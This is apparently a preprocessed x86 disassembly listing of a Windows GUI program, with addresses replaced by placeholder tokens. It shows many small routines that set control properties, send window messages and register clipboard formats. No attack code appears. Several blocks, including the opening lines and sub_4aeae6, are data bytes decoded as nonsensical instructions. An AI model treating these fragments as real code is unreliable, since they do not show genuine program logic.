add [ eax ] al
add [ eax ] al
hlt
sub_49f505
[ edx ]
sub_4a1dfa
in al dx
[ ebp - 0x54005301 ]
sub_4a1e05
[ edx - 0x25002c01 ]
sub_4a1e0b
[ ecx + 0x4aa5a4ff ]
sub_4a2282
retn 0x4a
sub_4a254d
inc esp
add [ eax + 0x2 ] dh
add bh bh
xchg esp eax
retn
sub_4a25e1
inc esp
add [ eax + 0x18ff0002 ] al
retn
sub_4a3080
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ edx + esi * 4 ] ah
inc esi
add ah ah

sub_4a30e6
dec eax
add [ esp + edx + 0x14a80045 ] ah
inc ebp
add ah al

sub_4a30f2
dec eax
add [ edx + ecx * 8 ] ah
dec eax
add [ edx + ecx * 8 + 0x48 ] ch
add [ eax - 0x4bffb736 ] bh
enter 0x48 0x74

sub_4a35e7
add [ eax ] bl
in al dx
dec edx
add [ eax - 0x7ffba43 ] ch
0xebd8004a 0x4a
sub_4a36dc
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ edx + esi * 4 ] ah
inc esi
add ah ah

sub_4a3742
dec eax
add [ esp + edx + 0x14a80045 ] ah
inc ebp
add ah al

sub_4a374e
dec eax
add [ edx + ecx * 8 ] ah
dec eax
add [ edx + ecx * 8 + 0x48 ] ch
add [ eax - 0x4bffb736 ] bh
enter 0x48 0x74

sub_4a3980
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
pop ebx
retn
sub_4a39fc
jmp sub_448b58
sub_4a3a03
pop ebx
pop ecx
pop ebp
retn
sub_4a3a94
jmp sub_448b58
sub_4a3a9b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3b98
jmp sub_448b58
sub_4a3b9f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3ba8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1304
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_4a3c54
jmp sub_448b58
sub_4a3c5b
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3d36
jmp sub_448b58
sub_4a3d3d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3dd4
jmp sub_448b58
sub_4a3ddb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3eb6
jmp sub_448b58
sub_4a3ebd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a406c
mov al 0x1
retn
sub_4a4070
push ebx
cmp [ eax + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4a42f4
push ebx
mov ebx eax
mov eax ebx
call sub_490858
cmp [ ebx + 0x26c ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4a4828
sub_4a4310
cmp dl [ eax + 0x264 ]
je r-xdata
retn
mov [ eax + 0x264 ] dl
call sub_492ec4
sub_4a4462
jmp sub_448b58
sub_4a4469
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a4494
cmp dl [ eax + 0x271 ]
je r-xdata
retn
mov [ eax + 0x271 ] dl
call sub_492ec4
sub_4a44a8
cmp dl [ eax + 0x272 ]
je r-xdata
retn
mov [ eax + 0x272 ] dl
call sub_492ec4
sub_4a44bc
cmp dl [ eax + 0x273 ]
je r-xdata
retn
mov [ eax + 0x273 ] dl
mov ecx edx
mov edx 0x800
call sub_4a381c
sub_4a44d8
cmp dl [ eax + 0x27c ]
je r-xdata
retn
mov [ eax + 0x27c ] dl
test dl dl
je r-xdata
call sub_492ec4
mov [ eax + 0x270 ] dl
sub_4a4579
jmp sub_448b58
sub_4a4580
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a4619
jmp sub_448b58
sub_4a4620
pop ebx
mov esp ebp
pop ebp
retn
sub_4a46d7
jmp sub_448b58
sub_4a46de
pop ebx
pop ecx
pop ebp
retn
sub_4a46e4
push esi
mov esi eax
mov eax [ esi + 0x280 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4a479f
jmp sub_448b58
sub_4a47a6
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4913
jmp sub_448b58
sub_4a491a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4a02
jmp sub_448b58
sub_4a4a09
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4b3c
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
call sub_492ec4
sub_4a4c61
jmp sub_448b58
sub_4a4c68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4488a4#2
jmp sub_4488a4
sub_4a4dec
push ebx
cmp [ eax + 0x272 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_4a4e0c
push ebx
cmp [ eax + 0x27a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
sub_4a4e2c
mov edx [ eax + 0x264 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x2c0 ]
xchg edx eax
call sub_424744
retn
sub_4a4e98
push ebx
mov ebx edx
mov edx ebx
call sub_4926c0
call sub_44c2c8
cmp [ eax + 0x5 ] 0x0
jne r-xdata
pop ebx
retn
and [ ebx + 0x24 ] 0xfffffffc
sub_4a4ee8
cmp edx [ eax + 0x260 ]
je r-xdata
retn
mov [ eax + 0x260 ] edx
cmp [ eax + 0x269 ] 0x0
je r-xdata
mov edx eax
mov eax [ eax + 0x264 ]
call sub_4a5ad8
sub_4a501c
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
call sub_4a5060
sub_4a5060
cmp [ eax + 0x264 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
cmp [ eax + 0x268 ] 0x0
jne r-xdata
call sub_4a4fd8
retn
mov dl 0x1
sub_4a5080
cmp [ eax + 0x269 ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ eax + 0x264 ]
call sub_4a5ad8
sub_4a50dc
jmp sub_4488a4
j_sub_4488a4
jmp sub_4488a4
sub_4a5124
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a51cd
jmp sub_448b58
sub_4a51d4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a52d2
jmp sub_448b58
sub_4a5430
push ebx
mov ebx eax
mov eax ebx
call sub_4a42f4
mov eax ebx
call sub_4a53f0
pop ebx
retn
sub_4a593a
jmp sub_448b58
sub_4a5941
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a5a8a
jmp sub_448b58
sub_4a5a98
mov eax edx
mov edx ecx
call sub_4a4f44
retn
sub_4a5b2b
jmp sub_448b58
sub_4a5b32
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a5d4d
jmp sub_4488a4
sub_4a5db9
jmp sub_448b58
sub_4a5dd6
jmp sub_448b58
sub_4a5ddd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a5f04
jmp sub_448b58
sub_4a5f0b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a648c
call sub_492bec
retn
sub_4a6701
jmp sub_448b58
sub_4a6708
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4a6714
mov ecx [ eax + 0x278 ]
push ecx
mov ecx [ eax + 0x274 ]
call sub_4a6598
retn
sub_4a6728
mov ecx [ eax + 0x278 ]
cmp edx ecx
jg r-xdata
retn
push ecx
mov ecx [ eax + 0x280 ]
xchg edx ecx
call sub_4a6598
sub_4a6744
mov ecx [ eax + 0x274 ]
cmp edx ecx
jl r-xdata
retn
push edx
mov edx [ eax + 0x280 ]
call sub_4a6598
sub_4a6798
cmp dl [ eax + 0x262 ]
je r-xdata
retn
mov [ eax + 0x262 ] dl
call sub_492ec4
sub_4a67ac
cmp dl [ eax + 0x261 ]
je r-xdata
retn
mov [ eax + 0x261 ] dl
call sub_492ec4
sub_4a6838
cmp dl [ eax + 0x284 ]
je r-xdata
retn
mov [ eax + 0x284 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_492ec4
sub_4a688c
cmp dl [ eax + 0x270 ]
je r-xdata
retn
mov [ eax + 0x270 ] dl
call sub_492ec4
sub_4a68a0
cmp dl [ eax + 0x290 ]
je r-xdata
retn
mov [ eax + 0x290 ] dl
call sub_492ec4
sub_4a6960
cmp edx [ eax + 0x288 ]
je r-xdata
retn
mov [ eax + 0x288 ] edx
call sub_4a68b4
sub_4a6974
cmp edx [ eax + 0x28c ]
je r-xdata
retn
mov [ eax + 0x28c ] edx
call sub_4a68b4
sub_4a6988
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_4a6c8b
jmp sub_448b58
sub_4a6c92
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4a6ce7
jmp sub_448b58
sub_4a6cee
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4a6fa2
jmp sub_448b58
sub_4a70f0
jmp sub_448b58
sub_4a70f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a71a0
movzx eax [ eax + 0xd ]
xor al 0x1
retn
sub_4a7240
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_4a6fb8
sub_4a7250
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_42515c
sub_4a7260
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_42515c
sub_4a7364
mov eax [ eax + 0x18 ]
retn
sub_4a7484
jmp sub_448b58
sub_4a74dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_449d2c
pop esi
pop ebx
retn
sub_4a7824
push ebx
mov ebx eax
mov eax ebx
call sub_426b14
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_4a785c
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x4 ]
call sub_4a81e4
retn
sub_4a7934
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x4 ]
call sub_4a831c
retn
sub_4a7940
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4246e8
pop esi
pop ebx
retn
sub_4a7954
mov eax [ eax + 0x4c ]
call sub_424850
retn
sub_4a7a48
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4a7a40
cmp ebx [ eax + 0x2ec ]
je r-xdata
mov eax ebx
call sub_4481b0
sub_4a8008
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4a801c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x2a4 ] 0x0
je r-xdata
xchg edx eax
call sub_4a827c
retn
mov eax [ eax + 0x14 ]
retn
sub_4a8068
mov eax [ eax + 0x8 ]
call sub_4a7940
retn
sub_4a827c
add esp 0xffffffe8
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
call sub_4a81e4
mov edx esp
push edx
push 0xffffffff
push 0x1053
push eax
call SendMessageW
add esp 0x18
retn
sub_4a8304
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4a831c
sub_4a84a2
jmp sub_448b58
sub_4a84e8
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_4a831c
sub_4a8849
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4474a8
retn
sub_4a8855
jmp sub_448b58
j_sub_4a8849
jmp sub_4a8849
sub_4a885c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a887e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call j_sub_44936c
retn
sub_4a8877
jmp sub_448b58
sub_4a887e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a8bf3
jmp sub_448b58
sub_4a8bfa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a8c71
jmp sub_448b58
sub_4a8c78
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4a8fa8
jmp sub_448b58
sub_4a8faf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a8fb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4a81f0
call sub_4a7a48
pop esi
pop ebx
retn
sub_4a8fd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x106
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x28 ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_4a9086
jmp sub_448b58
sub_4a90ac
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_492ec4
sub_4a90c0
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_492ec4
sub_4a90d4
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_492ec4
sub_4a965c
jmp sub_448b58
sub_4a9802
jmp sub_448b58
sub_4a9a40
push ebx
mov ebx eax
mov eax [ ebx + 0x3e0 ]
call sub_4254d8
test eax eax
setg al
pop ebx
retn
sub_4a9c8f
jmp sub_448b58
sub_4a9c96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a9cb9
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_4a9cb2
jmp sub_448b58
sub_4a9cb9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a9d38
jmp sub_448b58
sub_4a9d3f
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4a9ea5
jmp sub_448b58
sub_4a9ee7
jmp sub_4488a4
sub_4a9eec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4aa077
jmp sub_4488a4
sub_4aa07c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4aa390
cmp dl [ eax + 0x2cf ]
je r-xdata
retn
mov [ eax + 0x2cf ] dl
call sub_4aa0b8
sub_4aa3a4
cmp dl [ eax + 0x2d0 ]
je r-xdata
retn
mov [ eax + 0x2d0 ] dl
call sub_4aa0b8
sub_4aa40c
cmp dl [ eax + 0x2a5 ]
je r-xdata
retn
mov [ eax + 0x2a5 ] dl
call sub_492ec4
sub_4aa420
cmp dl [ eax + 0x2d2 ]
je r-xdata
retn
mov [ eax + 0x2d2 ] dl
call sub_4aa0b8
sub_4aa434
cmp dl [ eax + 0x2cd ]
je r-xdata
retn
mov [ eax + 0x2cd ] dl
call sub_4aa0b8
sub_4aa448
cmp dl [ eax + 0x2ce ]
je r-xdata
retn
mov [ eax + 0x2ce ] dl
call sub_4aa0b8
sub_4aa45c
cmp dl [ eax + 0x26c ]
je r-xdata
retn
mov [ eax + 0x26c ] dl
call sub_492ec4
sub_4aa470
cmp dl [ eax + 0x28a ]
je r-xdata
retn
mov [ eax + 0x28a ] dl
call sub_492ec4
sub_4aa4cc
cmp dl [ eax + 0x288 ]
je r-xdata
retn
mov [ eax + 0x288 ] dl
call sub_492ec4
sub_4aa4e0
cmp dl [ eax + 0x28b ]
je r-xdata
retn
mov [ eax + 0x28b ] dl
call sub_492ec4
sub_4aa83f
jmp sub_448b58
sub_4aa846
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4aa874
cmp [ eax + 0x26d ] 0x3
sete al
retn
sub_4aa880
cmp [ eax + 0x2bc ] 0x0
setne al
retn
sub_4aa8cc
cmp dl [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] dl
call sub_492ec4
sub_4aa8e0
cmp dl [ eax + 0x26e ]
je r-xdata
retn
mov [ eax + 0x26e ] dl
call sub_492ec4
sub_4aab34
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a80e8
retn
sub_4aacb4
jmp sub_448b58
sub_4aacbb
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4aacc4
call sub_496868
push 0x0
push 0x0
push 0x1032
push eax
call SendMessageW
retn
sub_4ab011
jmp sub_448b58
sub_4ab407
jmp sub_448b58
sub_4ab574
jmp sub_448b58
sub_4ab6af
jmp sub_448b58
sub_4abbe8
jmp sub_448b58
sub_4abbef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4abc6c
push ebx
cmp [ eax + 0x332 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
sub_4abcbc
push ebx
cmp [ eax + 0x3c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c4 ]
call [ ebx + 0x3c0 ]
sub_4abd35
jmp sub_448b58
sub_4abd3c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4abe99
jmp sub_448b58
sub_4abea0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4ac21c
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4ac228
push esi
mov esi eax
mov eax [ esi + 0x29c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4ac238
push esi
mov esi eax
mov eax [ esi + 0x3e0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4ac52c
mov eax [ eax + 0x29c ]
call sub_4a734c
retn
sub_4ac624
movzx edx [ r-xdata ]
push edx
mov cl 0x4
xor edx edx
call sub_4ac6a0
retn
sub_4ac680
push ebx
cmp [ eax + 0x3aa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3ac ]
call [ ebx + 0x3a8 ]
sub_4ac9e4
jmp sub_448b58
sub_4ac9eb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4ad147
jmp sub_448b58
sub_4ad164
jmp sub_448b58
sub_4ad16b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4ad2c2
jmp sub_448b58
sub_4ad2c9
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4ad2dc
mov [ eax + 0x2ea ] 0x1
retn
sub_4ad74f
jmp sub_448b58
sub_4ad756
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4ad788
push esi
mov esi eax
mov [ esi + 0x2f4 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_4ad8ba
jmp sub_448b58
sub_4ad8c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4ad8c8
push ebx
cmp [ eax + 0x3ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3bc ]
call [ ebx + 0x3b8 ]
sub_4add49
jmp sub_448b58
sub_4add50
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4add58
mov eax [ eax + 0x28c ]
call sub_4a81b8
retn
j_sub_448b58#9
jmp sub_448b58
sub_4addf4
pop ecx
pop ebp
retn
sub_4addf8
mov eax [ r-xdata ]
retn
sub_4adf84
push ebx
mov ebx eax
mov eax ebx
call sub_425284
mov eax ebx
call sub_425180
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop ebx
retn
sub_4adff0
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_425180
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop ebx
retn
sub_4ae00c
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_425180
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop ebx
retn
sub_4ae028
push ebx
mov ebx eax
mov eax ebx
call sub_46a594
pop ebx
retn
sub_4ae09c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46a858
pop esi
pop ebx
retn
sub_4ae23d
add [ esp + 0x4 ] 0xffffffec
jmp sub_4af504
sub_4ae247
add [ esp + 0x4 ] 0xffffffec
jmp sub_4af610
sub_4ae251
add [ esp + 0x4 ] 0xffffffec
jmp sub_4af5fc
sub_4ae25b
add [ esp + 0x4 ] 0xffffffec
jmp sub_4af454
sub_4ae26f
add [ esp + 0x4 ] 0xffffffec
jmp sub_44b9ac
sub_4ae279
add [ esp + 0x4 ] 0xffffffec
jmp sub_44b9c0
sub_4ae790
push ebx
mov ecx [ eax + 0x2d4 ]
push ecx
mov ecx [ eax + 0x2d0 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
pop ebx
retn
sub_4ae9dc
jmp sub_448b58
sub_4aead9
jmp sub_448b58
sub_4aeae0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4aeae6
add [ eax ] al
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
sbb [ edx + eax + 0x108b0000 ] 0xff
push edx
adc al 0xc3
mov eax [ r-xdata ]
retn
sub_4aeb0c
mov eax [ r-xdata ]
retn
sub_4aec16
add [ eax ] al
mov eax 0x10
retn
sub_4aedbf
jmp sub_448b58
sub_4aedc6
pop ebx
pop ecx
pop ebp
retn
sub_4aeebb
jmp sub_448b58
sub_4aeec2
pop ecx
pop ebp
retn
sub_4aef58
mov eax [ eax + 0x20 ]
call sub_4257dc
retn
j_sub_448b58#8
jmp sub_448b58
sub_4af0a8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4af0d4
mov eax [ eax + 0x20 ]
call sub_4254d8
retn
sub_4af0e0
mov eax [ eax + 0x20 ]
call sub_4254d8
retn
sub_4af0ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46a858
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_4af20e
jmp sub_448b58
sub_4af215
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4af220
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_4af228
push ebx
mov ebx ecx
mov eax [ eax + 0x20 ]
call sub_4ae0b0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_4af2bc
mov eax [ r-xdata ]
retn
sub_4af2c4
mov eax [ r-xdata ]
retn
sub_4af334
jmp sub_448b58
sub_4af33b
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4af410
jmp sub_448b58
sub_4af417
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4af4d4
mov eax [ eax + 0xc ]
call sub_4254d8
retn
j_sub_448b58#7
jmp sub_448b58
sub_4af5ee
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4af5fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_4af6a5
jmp sub_448b58
sub_4af6ac
pop ebx
pop ecx
pop ebp
retn
j_sub_448b58#6
jmp sub_448b58
sub_4af720
pop ebx
pop ecx
pop ebp
retn
sub_4af8d2
jmp sub_448b58
sub_4af8d9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4afa79
jmp sub_448b58
sub_4afa80
pop ebx
pop ecx
pop ebp
retn
j_sub_448b58#5
jmp sub_448b58
sub_4afaf4
pop ebx
pop ecx
pop ebp
retn
j_sub_448b58#4
jmp sub_448b58
sub_4afb68
pop ebx
pop ecx
pop ebp
retn
j_sub_448b58#3
jmp sub_448b58
sub_4afc2c
pop ebx
pop ecx
pop ebp
retn
sub_4afc54
call sub_42528c
retn
sub_4afe4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4254e0
pop esi
pop ebx
retn
j_sub_448b58#2
jmp sub_448b58
sub_4aff0c
mov eax [ eax + 0x18 ]
retn
sub_4aff88
mov eax [ eax + 0x18 ]
retn
sub_4b005c
jmp sub_448b58
sub_4b0063
pop ebp
retn
j_sub_448b58
jmp sub_448b58
sub_4b00dc
pop ebp
retn
sub_4b00e0
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatW
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatW
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_4b01b0
call sub_4ced34
retn
sub_4b0204
cmp [ rw-data ] 0x0
je r-xdata
call sub_4ced34
retn
call [ rw-data ]
sub_4b021c
cmp [ rw-data ] 0x0
je r-xdata
call sub_4b0204
retn
call [ rw-data ]
sub_4b02a4
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_4b38cc
cmp [ rw-data ] 0x0
jne r-xdata
retn
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_4b7418
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4b70e0
sub_4b760c
push ebp
mov ebp esp
mov al [ ebp + 0xc ]
pop ebp
retn
sub_4b7638
push ebp
mov ebp esp
mov al [ ebp + 0xc ]
pop ebp
retn
sub_4b7718
push ebp
mov ebp esp
pop ebp
retn
sub_4b7720
push ebp
mov ebp esp
pop ebp
retn
sub_4b7728
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn
sub_4b7730
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn
sub_4b7738
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_4b7740
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn
sub_4b7948
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4b7950
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_4b7958
push ebp
mov ebp esp
pop ebp
retn
sub_4b809d
mov [ ebp - 0x3c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b88a4
mov [ ebp - 0x3c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b94b0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov al 0x1
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4b94d0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov eax 0x1
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4b94f4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov eax 0x1
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4b95d0
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x1c ]
mov [ ecx ] eax
mov eax 0x3
pop ebp
retn
sub_4b95ec
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x1c ]
mov [ ecx ] eax
mov eax 0x3
pop ebp
retn
sub_4b9608
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov eax 0x3
pop ebp
retn
sub_4b9724
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
hlt
sub_4c1618
add [ esp + 0x4 ] 0xfffffff0
jmp sub_4c0f64
sub_4c166c
push ebp
mov ebp esp
pop ebp
retn
sub_4c1674
push ebp
mov ebp esp
pop ebp
retn
sub_4c167c
push ebp
mov ebp esp
mov ax 0xffff
pop ebp
retn
sub_4c1688
push ebp
mov ebp esp
mov ax 0xffff
pop ebp
retn
sub_4c1694
push ebp
mov ebp esp
xor eax eax
